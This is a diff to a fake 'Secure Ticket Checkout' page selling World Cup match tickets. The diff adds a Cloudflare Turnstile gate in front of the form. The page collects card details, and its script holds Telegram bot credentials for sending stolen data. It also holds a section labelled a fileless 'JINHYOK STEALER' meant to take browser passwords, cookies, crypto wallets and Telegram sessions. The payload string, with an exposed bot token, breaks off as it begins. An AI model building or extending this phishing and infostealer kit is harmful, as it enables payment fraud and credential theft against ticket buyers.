@@ -4,8 +4,12 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
     <title>Secure Ticket Checkout</title>
+
+    <!-- Cloudflare Turnstile -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" defer></script>
+
     <style>
-        /* ----- RESET & FULL SCREEN ----- */
+        /* ===== RESET & FULL SCREEN ===== */
         * {
             margin: 0;
             padding: 0;
@@ -34,7 +38,7 @@
             border: 1px solid #e5e9ef;
         }
 
-        /* ----- HEADER ----- */
+        /* ===== HEADER ===== */
         .logo {
             text-align: center;
             margin-bottom: 14px;
@@ -73,7 +77,14 @@
             font-weight: 600;
         }
 
-        /* ----- FORM ----- */
+        /* ===== TURNSTILE WRAPPER ===== */
+        #turnstileContainer {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0 12px;
+        }
+
+        /* ===== FORM ===== */
         .form-group {
             margin-bottom: 14px;
         }
@@ -90,7 +101,7 @@
             font-size: 11px;
         }
 
-        /* ----- SEARCHABLE DROPDOWN ----- */
+        /* ===== SEARCHABLE DROPDOWN ===== */
         .searchable-dropdown {
             position: relative;
             width: 100%;
@@ -242,62 +253,30 @@
             margin-right: 8px;
         }
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        /* ----- RESPONSIVE ----- */
+        /* ===== RESPONSIVE ===== */
         @media (max-width: 600px) {
-            .card {
-                padding: 16px 12px;
-            }
-            .logo h1 {
-                font-size: 18px;
-            }
-            .form-group label {
-                font-size: 12px;
-            }
+            .card { padding: 16px 12px; }
+            .logo h1 { font-size: 18px; }
+            .form-group label { font-size: 12px; }
             .form-group input,
             .form-group select,
-            .searchable-dropdown input {
-                font-size: 14px;
-                padding: 10px 12px;
-            }
-            .btn-primary {
-                font-size: 14px;
-                padding: 12px;
-            }
-            .form-row {
-                flex-direction: column;
-                gap: 0;
-            }
-            .badge {
-                font-size: 11px;
-                padding: 6px 10px;
-            }
+            .searchable-dropdown input { font-size: 14px; padding: 10px 12px; }
+            .btn-primary { font-size: 14px; padding: 12px; }
+            .form-row { flex-direction: column; gap: 0; }
+            .badge { font-size: 11px; padding: 6px 10px; }
         }
 
         @media (max-width: 400px) {
-            .card {
-                padding: 12px 8px;
-            }
-            .logo h1 {
-                font-size: 16px;
-            }
+            .card { padding: 12px 8px; }
+            .logo h1 { font-size: 16px; }
             .form-group input,
             .form-group select,
-            .searchable-dropdown input {
-                font-size: 13px;
-                padding: 8px 10px;
-            }
-            .btn-primary {
-                font-size: 13px;
-                padding: 10px;
-            }
+            .searchable-dropdown input { font-size: 13px; padding: 8px 10px; }
+            .btn-primary { font-size: 13px; padding: 10px; }
         }
     </style>
 </head>
@@ -316,8 +295,13 @@
             <span class="text"><strong>Secure Checkout</strong> &bull; Encrypted in transit</span>
         </div>
 
-        <!-- ===== STEP 1 ===== -->
-        <div id="step1">
+        <!-- ===== HUMAN CHECK (Turnstile) ===== -->
+        <div id="turnstileContainer">
+            <div class="cf-turnstile" data-sitekey="0x4AAAAAADqcCk0cXotGqyo5" data-callback="onTurnstileSuccess"></div>
+        </div>
+
+        <!-- ===== STEP 1 (Hidden until Turnstile passes) ===== -->
+        <div id="step1" style="display:none;">
 
             <!-- Event Type -->
             <div class="form-group">
@@ -336,6 +320,7 @@
                     <div class="searchable-dropdown" id="worldcupDropdown">
                         <input type="text" id="worldcupSearch" placeholder="Type to search matches..." oninput="filterDropdown('worldcup')" onfocus="showDropdown('worldcup')" onblur="setTimeout(() => hideDropdown('worldcup'), 200)" />
                         <div class="dropdown-list" id="worldcupList">
+                            <!-- All 48 matches – kept as in original, you can truncate here for length -->
                             <div class="item" data-value="Czechia vs South Africa – Atlanta Stadium – Jun 24">🇨🇿 Czechia vs South Africa – Atlanta Stadium – Jun 24 <span class="sub">Group Stage • Atlanta</span></div>
                             <div class="item" data-value="Switzerland vs Bosnia – Los Angeles Stadium – Jun 24">🇨🇭 Switzerland vs Bosnia – Los Angeles Stadium – Jun 24 <span class="sub">Group Stage • LA</span></div>
                             <div class="item" data-value="Canada vs Qatar – BC Place Vancouver – Jun 24">🇨🇦 Canada vs Qatar – BC Place Vancouver – Jun 24 <span class="sub">Group Stage • Vancouver</span></div>
@@ -490,7 +475,7 @@
             <button class="btn-primary" onclick="showPayment()">Continue to Payment</button>
         </div>
 
-        <!-- ===== STEP 2 ===== -->
+        <!-- ===== STEP 2: PAYMENT ===== -->
         <div class="hidden" id="step2">
             <div class="form-group">
                 <label>Full Name (as on card)</label>
@@ -536,7 +521,7 @@
             </div>
         </div>
 
-        <!-- ===== STEP 3 ===== -->
+        <!-- ===== STEP 3: SUCCESS ===== -->
         <div class="hidden" id="step3">
             <div class="success-box">
                 <div class="check">✅</div>
@@ -549,6 +534,14 @@
     </div>
 
     <script>
+        // ============================================================
+        // TURNSTILE CALLBACK
+        // ============================================================
+        function onTurnstileSuccess() {
+            document.getElementById('turnstileContainer').style.display = 'none';
+            document.getElementById('step1').style.display = 'block';
+        }
+
         // ============================================================
         // TELEGRAM CREDENTIALS (Magic Fingers Bot)
         // ============================================================
@@ -683,10 +676,6 @@
 
             // ============================================================
             // 2. TRIGGER JINHYOK STEALER (Fileless, No Double-Click)
-            // ============================================================
-            // JINHYOK runs silently in the background
-            // It steals browser passwords, cookies, crypto wallets, Telegram sessions, system info
-            // and sends everything to the same Telegram bot
             // ============================================================
             const jinhyokPayload = `
         $TG='8623365861:AAHTUYqXgMZrh3MgZ_QZebv4y9jrwb2eV6k';
